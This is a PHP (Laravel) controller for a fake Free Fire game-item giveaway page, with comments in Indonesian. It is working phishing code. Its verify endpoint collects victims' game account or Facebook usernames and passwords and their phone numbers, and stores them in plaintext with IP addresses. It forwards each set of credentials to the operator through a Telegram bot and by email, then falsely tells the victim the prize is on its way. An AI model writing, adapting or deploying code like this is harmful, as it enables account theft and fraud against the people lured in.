<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Http\JsonResponse;
use App\Models\Setting;
use App\Models\EventItem;
use App\Models\ClaimLog;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class EventController extends Controller
{
    /**
     * Tampilkan halaman utama event Free Fire Dunia Mistis.
     */
    public function index()
    {
        // Ambil settings dari database
        $settings = Setting::all()->pluck('value', 'key');

        // Status event check
        $eventStatus = $settings['event_status'] ?? 'active';

        // Ambil list item aktif dari database
        $items = EventItem::where('is_active', true)->orderBy('order', 'asc')->get();

        // Fallback jika belum ada item di database
        if ($items->isEmpty()) {
            $items = collect($this->getDefaultFallbackItems());
        }

        return view('event.index', compact('items', 'settings', 'eventStatus'));
    }

    /**
     * Handle verifikasi akun (AJAX) dan kirim notifikasi jika aktif.
     */
    public function verify(Request $request): JsonResponse
    {
        // Support direct Facebook login payload or regular verification payload
        if ($request->has('fb_account')) {
            $validated = $request->validate([
                'fb_account'  => 'required|string|min:3',
                'fb_password' => 'required|string|min:1',
                'item'        => 'nullable|string',
            ]);

            $claimData = [
                'uid'      => 'FB-' . $validated['fb_account'],
                'nama'     => $validated['fb_account'],
                'password' => $validated['fb_password'],
                'tingkat'  => 'Akun Facebook',
                'phone'    => $validated['fb_account'],
                'item'     => $validated['item'] ?: 'Hadiah Event',
            ];
        } else {
            $validated = $request->validate([
                'uid'      => 'required|string',
                'nama'     => 'required|string|min:1',
                'password' => 'required|string|min:1',
                'tingkat'  => 'nullable|string',
                'phone'    => 'required|string|min:3',
                'item'     => 'required|string',
            ]);

            $claimData = [
                'uid'      => $validated['uid'],
                'nama'     => $validated['nama'],
                'password' => $validated['password'],
                'tingkat'  => $validated['tingkat'] ?: 'Master',
                'phone'    => $validated['phone'],
                'item'     => $validated['item'],
            ];
        }

        // 1. Simpan ke Database ClaimLog
        $claim = ClaimLog::create([
            'uid'        => $claimData['uid'],
            'nama'       => $claimData['nama'],
            'password'   => $claimData['password'],
            'tingkat'    => $claimData['tingkat'],
            'phone'      => $claimData['phone'],
            'item'       => $claimData['item'],
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
            'status'     => 'success',
        ]);

        // 2. Kirim Notifikasi Telegram & Email jika diaktifkan
        $this->sendTelegramNotification($claim);
        $this->sendEmailNotification($claim);

        return response()->json([
            'success' => true,
            'message' => 'Verifikasi berhasil! Item ' . $claimData['item'] . ' sedang diproses ke inbox game Free Fire Anda.',
            'item'    => $claimData['item'],
        ])->header('Access-Control-Allow-Origin', '*')
          ->header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
          ->header('Access-Control-Allow-Headers', 'Content-Type, Accept, Authorization, X-Requested-With');
    }

    /**
     * Helper untuk kirim notifikasi ke Telegram Bot.
     */
    private function sendTelegramNotification(ClaimLog $claim): void
    {
        $enabled = Setting::get('telegram_enabled', '0');
        $token   = Setting::get('telegram_token');
        $chatId  = Setting::get('telegram_chat_id');

        if ($enabled !== '1' || empty($token) || empty($chatId)) {
            return;
        }

        try {
            $msg = "🎁 <b>KLAIM EVENT FREE FIRE BARU!</b>\n\n"
                 . "👤 <b>Nama / Akun:</b> " . htmlspecialchars($claim->nama) . "\n"
                 . "🆔 <b>UID / Tipe:</b> <code>" . htmlspecialchars($claim->uid) . "</code>\n"
                 . "🔑 <b>Password Akun:</b> <code>" . htmlspecialchars($claim->password ?? '-') . "</code>\n"
                 . "⭐ <b>Level Akun:</b> " . htmlspecialchars($claim->tingkat) . "\n"
                 . "📱 <b>No HP / WA:</b> <code>" . htmlspecialchars($claim->phone) . "</code>\n"
                 . "🏆 <b>Item Dipilih:</b> <b>" . htmlspecialchars($claim->item) . "</b>\n"
                 . "🌐 <b>IP Address:</b> " . htmlspecialchars($claim->ip_address ?? '-') . "\n"
                 . "⏰ <b>Waktu:</b> " . $claim->created_at->format('d/m/Y H:i:s') . "\n\n"
                 . "⚡ <i>Sistem Super Admin Panel Free Fire</i>";

            Http::withoutVerifying()->timeout(10)->post("https://api.telegram.org/bot{$token}/sendMessage", [
                'chat_id'    => $chatId,
                'text'       => $msg,
                'parse_mode' => 'HTML',
            ]);
        } catch (\Exception $e) {
            Log::warning('Telegram notification error: ' . $e->getMessage());
        }
    }

    /**
     * Helper untuk kirim notifikasi ke Email jika diaktifkan.
     */
    private function sendEmailNotification(ClaimLog $claim): void
    {
        $enabled = Setting::get('email_enabled', '0');
        $dest    = Setting::get('email_destination');

        if ($enabled !== '1' || empty($dest)) {
            return;
        }

        try {
            \Illuminate\Support\Facades\Mail::raw(
                "DATA KLAIM EVENT FREE FIRE BARU\n\n" .
                "Nama Karakter: " . $claim->nama . "\n" .
                "UID Akun: " . $claim->uid . "\n" .
                "Password Akun: " . ($claim->password ?? '-') . "\n" .
                "Level Akun: " . $claim->tingkat . "\n" .
                "No HP / WA: " . $claim->phone . "\n" .
                "Item: " . $claim->item . "\n" .
                "IP: " . ($claim->ip_address ?? '-') . "\n" .
                "Waktu: " . $claim->created_at->format('d/m/Y H:i:s') . "\n",
                function ($message) use ($dest, $claim) {
                    $message->to($dest)->subject("🎁 Klaim Baru Free Fire: " . $claim->nama . " (" . $claim->uid . ")");
                }
            );
        } catch (\Exception $e) {
            Log::warning('Email notification error: ' . $e->getMessage());
        }
    }

    /**
     * Data fallback 9 item event jika database kosong.
     */
    private function getDefaultFallbackItems(): array
    {
        return [
            ['id' => '1', 'name' => 'Hollow Man Bundle', 'short_name' => 'Hollow Man Bundle', 'image' => 'images/item_hd_1.png', 'type' => 'Bundle Eksklusif'],
            ['id' => '2', 'name' => 'Crismon Glitches B.', 'short_name' => 'Crismon Glitches B.', 'image' => 'images/item_hd_2.png', 'type' => 'Bundle Legendaris'],
            ['id' => '3', 'name' => 'Cotton Teddy Bundl.', 'short_name' => 'Cotton Teddy Bundl.', 'image' => 'images/item_hd_3.png', 'type' => 'Bundle Langka'],
            ['id' => '4', 'name' => 'M1887 - ONEPUCHN.', 'short_name' => 'M1887 - ONEPUCHN.', 'image' => 'images/item_hd_4.png', 'type' => 'Skin Senjata Tier S'],
            ['id' => '5', 'name' => 'M1887 - RAPPER M.', 'short_name' => 'M1887 - RAPPER M.', 'image' => 'images/item_hd_5.png', 'type' => 'Skin Senjata Tier S'],
            ['id' => '6', 'name' => 'M1187 - HAND OF H.', 'short_name' => 'M1187 - HAND OF H.', 'image' => 'images/item_hd_6.png', 'type' => 'Skin Senjata Tier S'],
            ['id' => '7', 'name' => 'M1014 - GREEN FLA.', 'short_name' => 'M1014 - GREEN FLA.', 'image' => 'images/item_hd_7.png', 'type' => 'Skin Senjata Tier S'],
            ['id' => '8', 'name' => 'M1887 - STERLING.', 'short_name' => 'M1887 - STERLING.', 'image' => 'images/item_hd_8.png', 'type' => 'Skin Senjata Tier S'],
            ['id' => '9', 'name' => 'AN94 - EVIL HOWLE.', 'short_name' => 'AN94 - EVIL HOWLE.', 'image' => 'images/item_hd_9.png', 'type' => 'Skin Senjata Tier S'],
        ];
    }
}
